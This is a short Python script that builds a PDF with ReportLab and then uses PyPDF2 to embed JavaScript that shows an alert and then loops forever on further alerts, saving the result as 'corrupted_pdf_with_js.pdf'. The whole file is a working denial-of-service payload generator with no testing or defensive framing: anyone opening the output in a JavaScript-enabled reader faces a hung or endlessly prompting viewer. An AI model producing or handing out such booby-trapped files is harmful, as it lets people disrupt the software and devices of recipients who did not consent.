from reportlab.lib.pagesizes import letter
from reportlab.pdfgen import canvas
from PyPDF2 import PdfWriter, PdfReader

# Step 1: Create a basic PDF with ReportLab
def create_pdf(filename):
    c = canvas.Canvas(filename, pagesize=letter)
    c.drawString(100, 750, "This PDF contains JavaScript that will cause an infinite loop.")
    c.showPage()
    c.save()

# Step 2: Add JavaScript to create an infinite loop using PyPDF2
def add_infinite_loop_js(input_pdf, output_pdf):
    # Read the PDF we just created
    pdf_reader = PdfReader(input_pdf)
    pdf_writer = PdfWriter()

    # Copy all pages from the input to the output
    for page_num in range(len(pdf_reader.pages)):
        pdf_writer.add_page(pdf_reader.pages[page_num])

    # Define JavaScript for an infinite loop prompt
    js_code = """
    app.alert("Warning: Entering infinite loop...");
    while (true) {
        app.alert("Infinite loop prompt...");
    }
    """
    
    # Add JavaScript to the PDF writer
    pdf_writer.add_js(js_code)

    # Write the modified PDF to a new file
    with open(output_pdf, "wb") as output_file:
        pdf_writer.write(output_file)

# Create the initial PDF
input_pdf = "original_reportlab.pdf"
output_pdf = "corrupted_pdf_with_js.pdf"
create_pdf(input_pdf)

# Inject JavaScript to create an infinite loop
add_infinite_loop_js(input_pdf, output_pdf)
